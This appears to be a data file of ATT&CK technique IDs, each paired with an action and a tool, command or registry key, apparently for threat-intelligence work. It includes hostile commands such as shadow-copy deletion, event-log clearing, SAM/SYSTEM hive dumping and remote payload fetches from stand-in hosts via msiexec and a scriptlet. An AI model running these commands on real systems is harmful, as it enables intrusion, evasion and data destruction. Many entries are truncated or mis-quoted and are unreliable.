+t1494,alter,application binary
+t1495,overwrite,non volatile
+t1496,use,recource hijecking
+t1497,check/search,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runonce
+t1045,use,mpress
+t1146,use,export histfilesize=0
+t1085,use,document.write
+t1201,use,chage  l
+t1157,use,same name in higher up search path
+t1087,acquire information,dscacheutil  q group
+t1094,use,custom command and control protocol
+t1081,use,group policy preference
+t1110,use,pass the hash technique
+t1195,,w
+t1095,use,user datagram protocol
+t1079,use,protocol encryption scheme
+t1483,incorporate,seed value
+t1199,use,valid account
+t1060,create,nt\currentversion\winlogon\shellhkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run
+t1091,modify,media
+t1042,use,hkey_classes_root[handler]
+t1087,use,get msolrolemember powershell cmdlet
+t1143,use,scripting language
+t1069,use,dscl .  list /groups
+t1087,use,passwd"""""""
+t1497,enumerate,"""vmware""""/
+t1054,use,powershell
+t1050,use,utility
+t1014,incercept,operating system api call
+t1168,modify,crontab file
+t1490,use,""vssadmin.exe delete shadows"""
+t1497,check/search,"""vmware""""/
+t1004,modify,winlogon registry key
+t1497,check/search,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
+t1095,use,transport layer protocol
+t1114,access,email forwarding rule
+t1198,modify,hklm\software[\wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllgetsigneddatamsg{{sip_guid}} to the dll providing sip?s cryptsipdllgetsigneddatamsg function
+t1001,use,non standard data encoding system
+t1048,use,internet web service
+t1150,modify,~/library/preferences
+t1144,load app,external hard drive
+t1196,double click,double click the file
+t1493,intercept,data over connection
+t1021,use,ssh
+t1135,use,df  ah
+t1047,use,remote procedure call service
+t1022,use,aes
+t1166,use,chmod via bitmasking
+t1183,register,malicious debugger
+t1110,use,management service
+t1106,use,createprocess   api
+t1171,respond,nbt ns
+t1064,interact,operating system at api label
+t1064,,veil
+t1048,use,h
+t1160,disguise,system/library/launchdaemons
+t1500,use,mingw
+t1032,employ,rc6
+t1220,use,msxsl.exe/wmi/windows management instrumentation
+t1497,use,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
+t1083,use,dir/tree
+t1052,use,usb drive
+t1055,use,mem
+t1069,use,groups
+t1096,use,ads
+t1130,use,path
+t1003,use,mimipenguin tool
+t1088,use,eventvwr.exe
+t1497,enumerate,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
+t1003,use,text string/regex pattern
+t1192,accompany,link with social engineering text
+t1130,use,system.keychain
+t1061,use,remote interactive session technique
+t1143,use,powershell
+t1090,use,zxproxy
+t1082,use,ver utility
+t1055,write dll path,process
+t1159,use,launchd/launchctl
+t1070,use,wevtutil cl system
+t1142,use,security command line utility
+t1497,use,""wmi query $q = """"select * from win32_fan"""" get wmiobject  query $q""""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"""
+t1497,check/search,"""wmi query $q = ""select * from win32_fan"" get wmiobject  query $q""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"
+t1497,enumerate,"""wmi query $q = ""select * from win32_fan"" get wmiobject  query $q""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"
+t1497,use,"""vmware""""/
+t1096,use,mft
+t1032,employ,3des
+t1483,generate,different domain
+t1027,use,language specific semantic
+t1218,,msiexec.exe /q /i http[:]//site[.]com/file.msi
+t1116,create,certificate
+t1060,create,hkey_local_machine\software\microsoft\windows
+t1140,use,b command
+t1021,use,valid account technique
+t1092,use,replication through removable media technique
+t1108,credentialed access,remote service
+t1168,use,at program
+t1173,use,dde command
+t1132,use,mime
+t1106,use,createprocesswithtokenw   api
+t1003,use,""reg save hklm\system system"""""""
+t1497,use,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
+t1480,use,filename
+t1048,use,ftp
+t1060,use,masquerading
+t1187,use,template injection
+t1066,use,updated version
+t1114,create,cache files/ .pst / .ost
+t1110,use,brute force technique
+t1137,,hkey_current_user\software\microsoft\office test\special\perf
+t1143,abuse,powershell
+t1018,use,c:\windows\system32\drivers\etc\hosts file
+t1022,use,custom algorithm
+t1196,use,spearphishing attachment
+t1032,use,xor
+t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\explorer\shell folders
+t1137,crafted,html page
+t1071,use,http
+t1106,use,createprocessinternalw   api
+t1107,use,windows sysinternals sdelete
+t1189,use,iframes
+t1116,forge,certificate
+t1036,move executable,trusted location
+t1055,create,suspended process
+t1032,use,plink utility
+t1022,use,utility
+t1134,dulicate,existing token
+t1180,modify,hkcu\control panel\desktop\screensaveactive
+t1021,use,remote service
+t1069,use,net group /domain
+t1114,create,webmail application/outlook web access
+t1143,use,jscript
+t1014,hook,operating system api call
+t1090,use,zxportmsp
+t1051,use,network file share
+t1480,use,system time
+t1032,use,tls
+t1076,use,credential access technique
+t1124,use,net
+t1087,use,azure cli
+t1085,use,getobject """"script:https[:]//www[.]example[.]com/malicious.sct"""" """""""
+t1497,enumerate,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
+t1092,use,removable media
+t1032,employ,openssl
+t1105,use,command and control channel
+t1124,use,tz'
+t1118,use,trusted windows utility
+t1071,use,standardized application layer protocol
+t1194,leverage,social media services
+t1087,acquire information,net group
+t1022,use,
+t1034,create program,improperly specified program
+t1149,modify,lc_unixthread
+t1205,send,series of packet
+t1043,use,udp:22  ssh
+t1032,use,3des
+t1499,use,tls protocol
+t1043,use,tcp:80  http
+t1196,use,command line
+t1192,use,browser exploit
+t1485,use,rm
+t1096,use,master file table
+t1130,use,library
+t1499,use,service exhaustion flood
+t1090,use,port redirection
+t1020,use,exfiltration over command and control channel technique
+t1486,withhold,decryption key
+t1002,use,algorithm
+t1074,use,data encrypted technique
+t1117,pass,uniform resource locator
+t1087,use,id"""""""
+t1498,use,direct network flood
+t1498,use,icmp
+t1498,use,reflection amplification
+t1498,use,ntp
+t1498,use,botnet
+t1498,use,dns
+t1498,use,memcache protocol
+t1498,use,udp
+t1499,use,syn flood
+t1499,use,"""ssl"
+t1499,exploit,vulnerability
+t1499,use,os exhaustion flood
+t1499,use,application exhaustion flood
+t1499,use,botnet
+t1499,use,ack flood
+t1499,use,system exploitation
+t1499,use,application exploitation
+t1499,use,simple http flood
+t1499,use,ssl renegotiation attack
+t1500,use,spearphishing attachment technique
+t1500,use,csc.exe
+t1500,use,gcc
+t1501,,create
+t1501,,modify
